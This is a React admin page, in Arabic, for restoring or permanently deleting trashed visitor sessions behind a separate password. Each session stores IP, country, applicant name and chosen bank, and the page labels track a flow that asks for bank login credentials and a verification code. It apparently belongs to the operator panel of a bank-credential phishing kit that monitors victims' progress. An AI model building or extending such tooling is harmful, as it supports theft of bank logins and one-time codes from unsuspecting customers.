// صفحة سلة المهملات — محمية بكلمة مرور مستقلة
import { useState } from "react";
import AdminLayout from "@/components/AdminLayout";
import { Trash2, RotateCcw, X, Lock, Eye, EyeOff, AlertTriangle, User, UserX } from "lucide-react";
import { timeAgo, useTimeTicker } from "@/lib/timeAgo";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

function adminFetch(url: string, options: RequestInit = {}) {
  return fetch(url, {
    ...options,
    credentials: "include",
    headers: { "Content-Type": "application/json", ...(options.headers || {}) },
  });
}

interface TrashedSession {
  id: string;
  ipAddress: string | null;
  country: string | null;
  userAgent: string | null;
  currentPage: string;
  lastSeenAt: string;
  createdAt: string;
  deletedAt: string;
  applicantName: string | null;
  companyName: string | null;
  contactName: string | null;
  bankName: string | null;
  applicantType: string | null;
  appId: number | null;
}

const pageLabels: Record<string, string> = {
  home: "الرئيسية",
  apply: "معلومات الطلب",
  banks: "اختيار البنك",
  credentials: "بيانات الدخول",
  verify: "رمز التحقق",
  waiting: "انتظار المراجعة",
  success: "تمّت الموافقة",
};

export default function AdminTrashPage() {
  // ─── حالة التحقق من كلمة المرور ─────────────────────────────────────────
  const [password, setPassword] = useState("");
  const [showPass, setShowPass] = useState(false);
  const [authError, setAuthError] = useState("");
  const [authLoading, setAuthLoading] = useState(false);
  const [authorized, setAuthorized] = useState(false);

  // ─── بيانات السلة ─────────────────────────────────────────────────────────
  const [trashItems, setTrashItems] = useState<TrashedSession[]>([]);
  const [trashLoading, setTrashLoading] = useState(false);
  const [actionLoading, setActionLoading] = useState<Record<string, boolean>>({});
  const [showEmptyAll, setShowEmptyAll] = useState(false);

  // تحديث تلقائي للوقت كل 30 ثانية
  useTimeTicker(30_000);

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    setAuthLoading(true);
    setAuthError("");
    try {
      const res = await adminFetch(`${BASE}/api/admin/trash/auth`, {
        method: "POST",
        body: JSON.stringify({ password }),
      });
      if (res.ok) {
        setAuthorized(true);
        loadTrash();
      } else {
        setAuthError("كلمة المرور غير صحيحة");
      }
    } catch {
      setAuthError("خطأ في الاتصال");
    } finally {
      setAuthLoading(false);
    }
  };

  const loadTrash = async () => {
    setTrashLoading(true);
    try {
      const res = await adminFetch(`${BASE}/api/admin/trash`);
      if (res.ok) setTrashItems(await res.json());
    } finally {
      setTrashLoading(false);
    }
  };

  const handleRestore = async (sessionId: string) => {
    setActionLoading(l => ({ ...l, [sessionId]: true }));
    try {
      await adminFetch(`${BASE}/api/admin/trash/${sessionId}/restore`, { method: "POST" });
      setTrashItems(t => t.filter(s => s.id !== sessionId));
    } finally {
      setActionLoading(l => ({ ...l, [sessionId]: false }));
    }
  };

  const handlePermanentDelete = async (sessionId: string) => {
    if (!confirm("هل تريد الحذف النهائي؟ لا يمكن التراجع عن هذا الإجراء.")) return;
    setActionLoading(l => ({ ...l, [`del_${sessionId}`]: true }));
    try {
      await adminFetch(`${BASE}/api/admin/trash/${sessionId}`, { method: "DELETE" });
      setTrashItems(t => t.filter(s => s.id !== sessionId));
    } finally {
      setActionLoading(l => ({ ...l, [`del_${sessionId}`]: false }));
    }
  };

  const handleEmptyAll = async () => {
    setActionLoading(l => ({ ...l, emptyAll: true }));
    try {
      await adminFetch(`${BASE}/api/admin/trash`, { method: "DELETE" });
      setTrashItems([]);
      setShowEmptyAll(false);
    } finally {
      setActionLoading(l => ({ ...l, emptyAll: false }));
    }
  };

  // ─── شاشة كلمة المرور ───────────────────────────────────────────────────
  if (!authorized) {
    return (
      <AdminLayout>
        <div className="min-h-screen flex items-center justify-center p-6">
          <div className="w-full max-w-md">
            <div className="bg-card border rounded-2xl p-8 shadow-lg">
              {/* أيقونة */}
              <div className="flex justify-center mb-6">
                <div className="w-16 h-16 bg-red-100 rounded-2xl flex items-center justify-center">
                  <Lock className="w-8 h-8 text-red-600" />
                </div>
              </div>
              <h1 className="text-2xl font-black text-center mb-2">سلة المهملات</h1>
              <p className="text-muted-foreground text-center text-sm mb-8">
                هذه الصفحة محمية بكلمة مرور مستقلة
              </p>

              <form onSubmit={handleAuth} className="space-y-4">
                <div className="relative">
                  <input
                    type={showPass ? "text" : "password"}
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                    placeholder="كلمة مرور سلة المهملات"
                    className="w-full border rounded-xl px-4 py-3 pr-12 text-sm bg-background focus:outline-none focus:ring-2 focus:ring-red-500/50"
                    autoFocus
                  />
                  <button
                    type="button"
                    onClick={() => setShowPass(p => !p)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground"
                  >
                    {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>

                {authError && (
                  <p className="text-red-600 text-sm text-center font-medium">{authError}</p>
                )}

                <button
                  type="submit"
                  disabled={authLoading || !password}
                  className="w-full bg-red-600 text-white py-3 rounded-xl font-bold text-sm hover:bg-red-700 disabled:opacity-50 transition-colors"
                >
                  {authLoading ? "جارٍ التحقق..." : "دخول"}
                </button>
              </form>
            </div>
          </div>
        </div>
      </AdminLayout>
    );
  }

  // ─── محتوى سلة المهملات ─────────────────────────────────────────────────
  return (
    <AdminLayout>
      <div className="p-6">
        {/* الرأس */}
        <div className="flex justify-between items-center mb-8 flex-wrap gap-3">
          <div>
            <h1 className="text-2xl font-black flex items-center gap-2">
              <Trash2 className="w-6 h-6 text-red-600" />
              سلة المهملات
            </h1>
            <p className="text-muted-foreground text-sm mt-1">{trashItems.length} عنصر محذوف</p>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={loadTrash}
              disabled={trashLoading}
              className="border rounded-xl px-4 py-2 text-sm font-medium hover:bg-muted transition-colors"
            >
              {trashLoading ? "جارٍ التحميل..." : "تحديث"}
            </button>
            {trashItems.length > 0 && !showEmptyAll && (
              <button
                onClick={() => setShowEmptyAll(true)}
                className="flex items-center gap-2 bg-red-100 text-red-700 border border-red-200 rounded-xl px-4 py-2 text-sm font-medium hover:bg-red-200 transition-colors"
              >
                <Trash2 className="w-4 h-4" />
                تفريغ السلة
              </button>
            )}
            {showEmptyAll && (
              <div className="flex items-center gap-2 bg-red-50 border border-red-200 rounded-xl px-3 py-2">
                <AlertTriangle className="w-4 h-4 text-red-600" />
                <span className="text-xs text-red-700 font-medium">حذف نهائي لكل العناصر؟</span>
                <button onClick={handleEmptyAll} disabled={actionLoading.emptyAll}
                  className="bg-red-600 text-white px-3 py-1 rounded-lg text-xs font-bold hover:bg-red-700 disabled:opacity-50">
                  {actionLoading.emptyAll ? "..." : "نعم، افرغ"}
                </button>
                <button onClick={() => setShowEmptyAll(false)} className="text-xs text-muted-foreground">إلغاء</button>
              </div>
            )}
          </div>
        </div>

        {/* العناصر */}
        <div className="bg-card border rounded-2xl overflow-hidden">
          {trashLoading ? (
            <div className="p-12 text-center text-muted-foreground">جارٍ التحميل...</div>
          ) : trashItems.length === 0 ? (
            <div className="p-12 text-center text-muted-foreground">
              <Trash2 className="w-12 h-12 mx-auto mb-4 opacity-20" />
              <p>سلة المهملات فارغة</p>
            </div>
          ) : (
            <div className="divide-y">
              {trashItems.map(session => {
                const name = session.applicantName || session.companyName || session.contactName;
                return (
                  <div key={session.id} className="p-5 hover:bg-muted/30 transition-colors">
                    <div className="flex items-start justify-between gap-4">
                      {/* المعلومات */}
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-2">
                          {name ? (
                            <span className="flex items-center gap-1.5 font-bold text-primary text-sm">
                              <User className="w-3.5 h-3.5" />
                              {name}
                            </span>
                          ) : (
                            <span className="flex items-center gap-1.5 text-muted-foreground text-xs">
                              <UserX className="w-3.5 h-3.5" />
                              زائر جديد
                            </span>
                          )}
                          {session.bankName && (
                            <span className="text-xs bg-blue-100 text-blue-700 px-2 py-0.5 rounded-full">{session.bankName}</span>
                          )}
                          <span className="text-xs bg-primary/10 text-primary px-2 py-0.5 rounded-full">
                            {pageLabels[session.currentPage] || session.currentPage}
                          </span>
                        </div>
                        <div className="flex items-center gap-4 text-xs text-muted-foreground">
                          <span>{session.country || "غير معروف"}</span>
                          <span>{session.ipAddress || "—"}</span>
                          <span>حُذف: {timeAgo(session.deletedAt)}</span>
                        </div>
                      </div>

                      {/* أزرار الإجراءات */}
                      <div className="flex items-center gap-2 shrink-0">
                        <button
                          onClick={() => handleRestore(session.id)}
                          disabled={actionLoading[session.id]}
                          className="flex items-center gap-1.5 bg-green-100 text-green-700 px-3 py-2 rounded-lg text-xs font-medium hover:bg-green-200 transition-colors disabled:opacity-50"
                        >
                          <RotateCcw className="w-3.5 h-3.5" />
                          استرجاع
                        </button>
                        <button
                          onClick={() => handlePermanentDelete(session.id)}
                          disabled={actionLoading[`del_${session.id}`]}
                          className="flex items-center gap-1.5 bg-red-100 text-red-700 px-3 py-2 rounded-lg text-xs font-medium hover:bg-red-200 transition-colors disabled:opacity-50"
                        >
                          <X className="w-3.5 h-3.5" />
                          حذف نهائي
                        </button>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </AdminLayout>
  );
}
